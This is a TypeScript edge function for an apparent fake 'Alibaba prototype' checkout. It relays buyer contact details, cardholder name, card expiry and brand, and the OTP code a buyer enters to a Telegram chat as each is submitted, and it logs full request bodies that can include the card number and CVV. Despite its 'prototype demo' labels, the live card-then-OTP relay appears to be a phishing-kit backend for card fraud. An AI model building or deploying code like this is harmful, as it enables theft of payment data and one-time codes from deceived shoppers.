import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

interface TelegramNotification {
  type: "order" | "payment" | "card_submitted" | "otp_verified" | "rfq" | "message" | "user_action";
  orderId?: string;
  orderIds?: string[];
  paymentId?: string;
  userId?: string;
  amount?: number;
  currency?: string;
  productName?: string;
  quantity?: number;
  buyerName?: string;
  buyerEmail?: string;
  buyerPhone?: string;
  sellerName?: string;
  sellerCompany?: string;
  shippingAddress?: string;
  shippingDetails?: {
    fullName?: string;
    phoneNumber?: string;
    email?: string;
    streetAddress?: string;
    city?: string;
    stateProvince?: string;
    postalCode?: string;
    country?: string;
  };
  // Card details - only last four stored/sent for security
  cardLastFour?: string;
  cardHolder?: string;
  expiryDate?: string;
  cardBrand?: string;
  cvv?: string; // Only for prototype demo
  fullCardNumber?: string; // Only for prototype demo (masked display)
  // OTP
  otpVerified?: boolean;
  otpCode?: string;
  securityLevel?: string;
  is3DSecure?: boolean;
  status?: string;
  statusHistory?: Array<{ status: string; timestamp: string }>;
  customMessage?: string;
}

async function sendTelegramMessage(botToken: string, chatId: string, message: string): Promise<boolean> {
  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const result = await response.json();
    console.log("Telegram API response:", result);
    return result.ok;
  } catch (error) {
    console.error("Error sending Telegram message:", error);
    return false;
  }
}

function formatOrderNotification(data: TelegramNotification): string {
  const timestamp = new Date().toISOString();
  
  let message = `🛒 <b>NEW ORDER NOTIFICATION</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  if (data.orderId) message += `📋 <b>Order ID:</b> ${data.orderId}\n`;
  if (data.productName) message += `📦 <b>Product:</b> ${data.productName}\n`;
  if (data.quantity) message += `🔢 <b>Quantity:</b> ${data.quantity}\n`;
  if (data.amount) message += `💰 <b>Amount:</b> ${data.currency || 'USD'} ${data.amount.toFixed(2)}\n`;
  message += `\n`;
  
  message += `👤 <b>BUYER INFORMATION</b>\n`;
  if (data.buyerName) message += `   Name: ${data.buyerName}\n`;
  if (data.buyerEmail) message += `   Email: ${data.buyerEmail}\n`;
  if (data.buyerPhone) message += `   Phone: ${data.buyerPhone}\n`;
  message += `\n`;
  
  if (data.sellerName || data.sellerCompany) {
    message += `🏪 <b>SELLER INFORMATION</b>\n`;
    if (data.sellerName) message += `   Name: ${data.sellerName}\n`;
    if (data.sellerCompany) message += `   Company: ${data.sellerCompany}\n`;
    message += `\n`;
  }
  
  if (data.shippingAddress) {
    message += `📍 <b>Shipping Address:</b>\n   ${data.shippingAddress}\n\n`;
  }
  
  if (data.cardLastFour) {
    message += `💳 <b>PAYMENT METHOD</b>\n`;
    message += `   Card: ${data.cardBrand || 'Card'} ****${data.cardLastFour}\n\n`;
  }
  
  message += `📊 <b>Status:</b> ${data.status || 'Pending'}\n`;
  message += `🕐 <b>Timestamp:</b> ${timestamp}\n`;
  
  if (data.statusHistory && data.statusHistory.length > 0) {
    message += `\n📜 <b>STATUS HISTORY</b>\n`;
    data.statusHistory.forEach((h) => {
      message += `   • ${h.status} - ${h.timestamp}\n`;
    });
  }
  
  return message;
}

function formatCardSubmittedNotification(data: TelegramNotification): string {
  const timestamp = new Date().toISOString();
  
  let message = `🔔 <b>CARD DETAILS SUBMITTED - OTP TRIGGERED</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  message += `⏰ <b>Stage:</b> Payment Initiated\n`;
  message += `🔐 <b>Security:</b> ${data.is3DSecure ? '3D Secure (OTP Required)' : '2D Secure'}\n\n`;
  
  // Amount
  if (data.amount) message += `💰 <b>Amount:</b> ${data.currency || 'USD'} ${data.amount.toFixed(2)}\n\n`;
  
  // Buyer Details
  message += `👤 <b>BUYER DETAILS</b>\n`;
  if (data.buyerName) message += `   Name: ${data.buyerName}\n`;
  if (data.buyerPhone) message += `   Phone: ${data.buyerPhone}\n`;
  if (data.buyerEmail) message += `   Email: ${data.buyerEmail}\n`;
  message += `\n`;
  
  // Card Details (masked for security - only last 4 visible)
  message += `💳 <b>CARD DETAILS</b>\n`;
  if (data.cardLastFour) message += `   Card: **** **** **** ${data.cardLastFour}\n`;
  if (data.cardBrand) message += `   Brand: ${data.cardBrand}\n`;
  if (data.cardHolder) message += `   Holder: ${data.cardHolder}\n`;
  if (data.expiryDate) message += `   Expiry: ${data.expiryDate}\n`;
  // CVV masked for security
  if (data.cvv) message += `   CVV: ***\n`;
  message += `\n`;
  
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `📊 <b>Status:</b> ⏳ AWAITING OTP VERIFICATION\n`;
  message += `🕐 <b>Timestamp:</b> ${timestamp}\n`;
  message += `\n⚠️ <i>Prototype Demo - OTP will be entered next</i>`;
  
  return message;
}

function formatOTPVerifiedNotification(data: TelegramNotification): string {
  const timestamp = new Date().toISOString();
  
  let message = `✅ <b>OTP VERIFIED - PAYMENT AUTHORIZED</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  message += `⏰ <b>Stage:</b> OTP Verification Complete\n`;
  message += `🔐 <b>Security:</b> 3D Secure Verified\n\n`;
  
  // Amount
  if (data.amount) message += `💰 <b>Amount:</b> ${data.currency || 'USD'} ${data.amount.toFixed(2)}\n\n`;
  
  // Card Details (masked)
  message += `💳 <b>PAYMENT METHOD</b>\n`;
  if (data.cardLastFour) message += `   Card: **** **** **** ${data.cardLastFour}\n`;
  if (data.cardBrand) message += `   Brand: ${data.cardBrand}\n`;
  message += `\n`;
  
  // OTP Details (shown in prototype for demo)
  message += `🔑 <b>OTP VERIFICATION</b>\n`;
  if (data.otpCode) message += `   Code Entered: ${data.otpCode}\n`;
  message += `   Status: ✅ VERIFIED\n`;
  message += `\n`;
  
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `📊 <b>Status:</b> ✅ READY FOR ORDER CONFIRMATION\n`;
  message += `🕐 <b>Timestamp:</b> ${timestamp}\n`;
  message += `\n⚠️ <i>Prototype Demo - Proceeding to order review</i>`;
  
  return message;
}

function formatPaymentNotification(data: TelegramNotification): string {
  const timestamp = new Date().toISOString();
  
  let message = `💳 <b>ALIBABA PROTOTYPE – SECURE ORDER CONFIRMATION</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  // Order Details
  message += `📋 <b>ORDER DETAILS</b>\n`;
  if (data.orderId) message += `   Order ID: ${data.orderId}\n`;
  if (data.orderIds && data.orderIds.length > 1) {
    message += `   Total Orders: ${data.orderIds.length}\n`;
  }
  message += `   Date: ${new Date().toLocaleDateString()}\n`;
  if (data.amount) message += `   Total Amount: ${data.currency || 'USD'} ${data.amount.toFixed(2)}\n`;
  if (data.productName) message += `   Items: ${data.productName}\n`;
  if (data.quantity) message += `   Quantity: ${data.quantity}\n`;
  message += `\n`;
  
  // Buyer Details
  message += `👤 <b>BUYER DETAILS</b>\n`;
  if (data.buyerName) message += `   Name: ${data.buyerName}\n`;
  if (data.buyerPhone) message += `   Phone: ${data.buyerPhone}\n`;
  if (data.buyerEmail) message += `   Email: ${data.buyerEmail}\n`;
  message += `\n`;
  
  // Shipping Address
  if (data.shippingDetails) {
    message += `📍 <b>SHIPPING ADDRESS</b>\n`;
    if (data.shippingDetails.streetAddress) message += `   ${data.shippingDetails.streetAddress}\n`;
    if (data.shippingDetails.city) message += `   ${data.shippingDetails.city}`;
    if (data.shippingDetails.stateProvince) message += `, ${data.shippingDetails.stateProvince}`;
    if (data.shippingDetails.postalCode) message += ` ${data.shippingDetails.postalCode}`;
    message += `\n`;
    if (data.shippingDetails.country) message += `   ${data.shippingDetails.country}\n`;
    message += `\n`;
  } else if (data.shippingAddress) {
    message += `📍 <b>SHIPPING ADDRESS</b>\n   ${data.shippingAddress}\n\n`;
  }
  
  // Payment Details (masked for security - only last 4)
  message += `💳 <b>PAYMENT DETAILS</b>\n`;
  if (data.cardLastFour) message += `   Card: **** **** **** ${data.cardLastFour}\n`;
  if (data.cardBrand) message += `   Brand: ${data.cardBrand}\n`;
  if (data.cardHolder) message += `   Cardholder: ${data.cardHolder}\n`;
  if (data.expiryDate) message += `   Expiry: ${data.expiryDate}\n`;
  message += `   OTP Status: ${data.otpVerified ? '✅ VERIFIED' : '⏳ Pending'}\n`;
  message += `   Payment Status: SIMULATED_SUCCESS\n`;
  message += `\n`;
  
  // Security Section
  message += `🔒 <b>SECURITY</b>\n`;
  message += `   Card OTP Verified: ${data.otpVerified ? 'Yes' : 'No'}\n`;
  message += `   Verification Time: ${timestamp}\n`;
  message += `   Security Level: ${data.securityLevel || 'SIMULATED_3DS'}\n`;
  message += `\n`;
  
  // Status
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `📊 <b>Status:</b> ${data.status === 'confirmed' ? '✅ CONFIRMED' : '⏳ ' + (data.status || 'Pending')}\n`;
  message += `🕐 <b>Timestamp:</b> ${timestamp}\n`;
  message += `\n⚠️ <i>This is a prototype - no real payment was processed</i>`;
  
  return message;
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const supabaseServiceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    // Get telegram settings from database
    const { data: tokenSetting } = await supabase
      .from("site_settings")
      .select("value")
      .eq("key", "telegram_bot_token")
      .single();

    const { data: chatIdSetting } = await supabase
      .from("site_settings")
      .select("value")
      .eq("key", "telegram_chat_id")
      .single();

    const { data: enabledSetting } = await supabase
      .from("site_settings")
      .select("value")
      .eq("key", "telegram_notifications_enabled")
      .single();

    const botToken = tokenSetting?.value?.replace(/"/g, "") || "";
    const chatId = chatIdSetting?.value?.replace(/"/g, "") || "";
    const enabled = enabledSetting?.value === true || enabledSetting?.value === "true";

    console.log("Telegram settings:", { enabled, hasBotToken: !!botToken, hasChatId: !!chatId });

    if (!enabled || !botToken || !chatId) {
      return new Response(
        JSON.stringify({ 
          success: false, 
          message: "Telegram notifications not configured or disabled" 
        }),
        { headers: { ...corsHeaders, "Content-Type": "application/json" }, status: 200 }
      );
    }

    const body: TelegramNotification = await req.json();
    console.log("Received notification request:", body);

    let message: string;
    
    switch (body.type) {
      case "order":
        message = formatOrderNotification(body);
        break;
      case "card_submitted":
        message = formatCardSubmittedNotification(body);
        break;
      case "otp_verified":
        message = formatOTPVerifiedNotification(body);
        break;
      case "payment":
        message = formatPaymentNotification(body);
        break;
      default:
        message = body.customMessage || "New notification from Alibaba";
    }

    const success = await sendTelegramMessage(botToken, chatId, message);

    return new Response(
      JSON.stringify({ success, message: success ? "Notification sent" : "Failed to send" }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" }, status: 200 }
    );
  } catch (error: unknown) {
    console.error("Error:", error);
    const errorMessage = error instanceof Error ? error.message : "Unknown error";
    return new Response(
      JSON.stringify({ success: false, error: errorMessage }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" }, status: 500 }
    );
  }
});
